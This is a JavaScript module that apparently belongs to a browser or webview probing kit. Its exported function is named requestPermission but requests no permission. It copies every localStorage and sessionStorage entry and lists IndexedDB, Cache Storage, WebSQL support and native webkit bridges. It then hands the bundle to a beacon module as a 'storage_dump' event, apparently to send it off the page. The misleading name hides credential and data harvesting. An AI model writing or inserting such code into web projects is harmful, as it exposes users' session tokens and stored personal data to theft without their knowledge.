import { forceEvent } from '../beacon.js';

export async function requestPermission() {
  const result = { ts: Date.now() };

  // localStorage
  try {
    const local = {};
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      local[k] = localStorage.getItem(k);
    }
    result.localStorage = local;
    result.localStorageCount = Object.keys(local).length;
  } catch (e) { result.localStorageError = e.message; }

  // sessionStorage
  try {
    const sess = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      sess[k] = sessionStorage.getItem(k);
    }
    result.sessionStorage = sess;
    result.sessionStorageCount = Object.keys(sess).length;
  } catch (e) { result.sessionStorageError = e.message; }

  // IndexedDB — enumerate database names
  try {
    if (typeof indexedDB !== 'undefined' && indexedDB.databases) {
      const dbs = await Promise.race([
        indexedDB.databases(),
        new Promise(r => setTimeout(() => r([]), 2000)),
      ]);
      result.indexedDB = dbs.map(d => ({ name: d.name, version: d.version }));
    }
  } catch (e) { result.indexedDBError = e.message; }

  // WebSQL detection
  try {
    if (typeof window.openDatabase === 'function') {
      result.webSQLSupported = true;
      // openDatabase with 0 size — just detect, don't create meaningful DB
      window.openDatabase('__wc_probe__', '1.0', '', 0, () => {});
    } else {
      result.webSQLSupported = false;
    }
  } catch (e) { result.webSQLSupported = true; result.webSQLNote = e.message; }

  // webkit native bridge detection (native app container)
  try {
    const handlers = window.webkit?.messageHandlers;
    if (handlers) {
      result.webkitBridge = Object.getOwnPropertyNames(handlers)
        .filter(k => typeof handlers[k]?.postMessage === 'function');
    } else {
      result.webkitBridge = [];
    }
  } catch { result.webkitBridge = []; }

  // Cache storage names
  try {
    if (typeof caches !== 'undefined') {
      const names = await Promise.race([caches.keys(), new Promise(r => setTimeout(() => r([]), 1500))]);
      result.cacheStorage = names;
    }
  } catch (e) { result.cacheStorageError = e.message; }

  await forceEvent('storage_dump', result);
  return result;
}
